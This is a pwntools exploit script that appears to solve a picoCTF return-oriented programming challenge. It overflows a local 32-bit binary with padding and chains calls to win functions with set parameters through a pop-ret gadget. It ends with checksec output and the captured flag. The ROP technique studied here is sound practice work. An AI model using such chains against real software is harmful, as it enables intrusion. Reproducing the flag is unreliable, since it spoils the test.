#!/usr/bin/env python3

from pwn import *

exe = './rop'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#host,port = '',

p = process(exe)
#p = remote(host,port)

padding = 28
param1 = 0xbaaaaaad
param2 = 0xdeadbaad

pop_ret = 0x0804840d # ropper --file rop --search "pop" # 0x0804840d: pop ebx; ret;

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    elf.symbols.win_function1,# address of winFunc 1 in EIP
    elf.symbols.win_function2, # return address of winFunc1, calling winFunc2() after calling winFunc1()
    pop_ret,
    param1, # passing param1 as parameter to winFunc2 
    elf.symbols.flag, # return address of winFunc2, calling flag() func after calling winFunc2()
    pop_ret,
    param2, # passing param2 as a parameter to flag() func
    elf.symbols.main,# return address of flag() func
)

p.sendlineafter(b'> ',payload)
p.interactive()
'''
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

`picoCTF{rOp_aInT_5o_h4Rd_R1gHt_536d67d1}`
'''
